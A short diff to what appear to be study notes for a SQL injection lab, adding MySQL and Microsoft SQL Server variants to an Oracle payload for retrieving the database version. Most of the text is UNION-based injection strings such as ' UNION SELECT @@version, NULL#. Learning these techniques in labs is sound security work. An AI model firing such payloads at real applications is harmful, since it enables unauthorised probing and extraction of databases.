@@ -18,3 +18,12 @@ Analysis:
 (3) output the database version
 
 ' UNION SELECT banner, NULL from v$version-- 
+
+// for  MySQL and Microsoft
+
+Microsoft	--: SELECT @@version
+' UNION SELECT @@version, NULL# 
+
+
+MySQL	--:     SELECT @@version
+
